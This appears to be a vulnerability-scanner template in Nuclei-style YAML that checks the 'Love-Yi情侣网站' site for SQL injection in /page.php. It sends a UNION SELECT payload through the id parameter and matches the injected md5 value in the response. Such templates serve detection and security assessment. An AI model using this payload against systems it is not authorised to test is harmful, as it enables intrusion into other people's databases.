id: poc-yaml-ki-love-yi-page-id-sqli
info:
  name: Love-Yi情侣网站 /page.php SQL 注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: Love-Yi情侣网站
variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"
http:
  - method: GET
    path:
      - "{{BaseURL}}/page.php?id=-6'+union+select+1,md5({{t1}}),3,4,5+--+"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
        part: body
